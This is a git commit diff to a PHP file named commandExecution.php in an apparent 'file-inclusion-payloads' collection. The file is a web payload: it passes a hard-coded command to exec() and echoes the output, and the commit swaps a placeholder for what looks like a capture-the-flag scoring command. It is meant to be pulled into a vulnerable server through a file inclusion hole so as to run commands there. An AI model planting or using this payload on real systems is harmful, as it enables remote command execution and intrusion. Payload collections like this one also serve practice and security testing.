9e5ce90d9254871e1f361313e01d4d41c996a126
Paulo Mota <44026675+paulogmota@users.noreply.github.com>
2023-05-12 12:11:32 -0300

    Update commandExecution.php

--- file-inclusion-payloads/commandExecution.php
+++ file-inclusion-payloads/commandExecution.php
@@ -1,5 +1,5 @@
 <?php
-    $command = 'INSERT COMMAND, PATH, SCRIPT HERE';
+    $command = '/usr/local/bin/score daee4bbb-30f5-4c24-abf7-f5eeddc7b891';
     $output = exec($command);
     // Print the output
     echo $output;
